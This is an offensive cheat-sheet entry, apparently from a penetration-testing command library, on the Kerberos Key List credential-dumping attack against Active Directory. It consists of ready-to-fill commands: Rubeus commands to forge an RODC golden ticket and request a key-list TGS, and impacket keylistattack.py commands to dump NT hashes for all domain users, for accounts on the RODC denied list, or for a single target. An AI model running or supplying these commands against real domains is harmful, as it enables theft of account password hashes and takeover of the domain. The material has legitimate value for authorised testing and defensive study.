---
technique: KerberosKeyList
category: credential-dumping
protocols: Kerberos
remote_capable: true
tags: kerberos rodc key-list nt-hash tgs-req credential-dumping ad
---

# KerberosKeyList

The Kerberos Key List attack abuses the `KERB-KEY-LIST-REQ` padata type (value 161) to recover a user's long-term secret (NT hash) from a writable DC. An attacker who knows the RODC's KRBTGT key forges a RODC golden ticket for the target user, then sends a TGS-REQ with `KERB-KEY-LIST-REQ` to the real KRBTGT service. The TGS-REP contains the user's NT hash in a `KERB-KEY-LIST-REP` field. This technique was designed for Azure AD hybrid SSO with legacy NTLM protocols.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| RODC KRBTGT key | AES256 key for a specific RODC's krbtgt account |
| RODC number | The msDS-SecondaryKrbTgtNumber of the RODC |
| Low-privileged domain creds | Needed for SAMR enumeration in the full dump mode |
| Target reachable | Must reach the RODC (or writable DC) on Kerberos port 88 |

## Windows

### Step 1: Forge RODC golden ticket (Rubeus)

#powershell #rubeus #kerberos #rodc

Forge a RODC golden ticket for the target user using the known RODC KRBTGT AES256 key.

```powershell title:"Forge RODC golden ticket with Rubeus"
.\Rubeus.exe golden /rodcNumber:"$rodc_number" /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:"$krbtgt_aes_key" /user:"$target_user" /id:"$target_rid" /domain:"$domain" /sid:"$domain_sid"
```
<!-- cheat
import domain_ip
var rodc_number
var krbtgt_aes_key
var target_user
var target_rid
var domain_sid
-->

### Step 2: Request TGS with KERB-KEY-LIST-REQ (Rubeus)

#powershell #rubeus #kerberos #rodc

Send a TGS-REQ with KERB-KEY-LIST-REQ using the forged RODC ticket to recover the target user's NT hash from the writable DC.

```powershell title:"Request key list TGS to recover NT hash with Rubeus"
.\Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:"krbtgt/$domain"
```
<!-- cheat
import domain_ip
-->

## Linux

### keylistattack.py (standard)

#impacket #python #kerberos #rodc

Dump NT hashes for domain users via the Key List attack using impacket with standard user enumeration.

```sh title:"Key List attack via keylistattack.py standard mode"
keylistattack.py -rodcNo "$rodc_number" -rodcKey "$krbtgt_aes_key" "$domain/$user:$pass@$rodc_host"
```
<!-- cheat
import domain_ip
import users
import passwords
var rodc_number
var krbtgt_aes_key
var rodc_host
-->

### keylistattack.py (full, including denied list)

#impacket #python #kerberos #rodc

Dump NT hashes for domain users via the Key List attack including accounts on the RODC Denied list.

```sh title:"Key List attack via keylistattack.py full mode including denied list"
keylistattack.py -rodcNo "$rodc_number" -rodcKey "$krbtgt_aes_key" -full "$domain/$user:$pass@$rodc_host"
```
<!-- cheat
import domain_ip
import users
import passwords
var rodc_number
var krbtgt_aes_key
var rodc_host
-->

### keylistattack.py (single target)

#impacket #python #kerberos #rodc

Recover the NT hash for a single target user via the Key List attack.

```sh title:"Key List attack for single target user via keylistattack.py"
keylistattack.py -rodcNo "$rodc_number" -rodcKey "$krbtgt_aes_key" -t "$target_user" -kdc "$rodc_host" LIST
```
<!-- cheat
import domain_ip
var rodc_number
var krbtgt_aes_key
var rodc_host
var target_user
-->
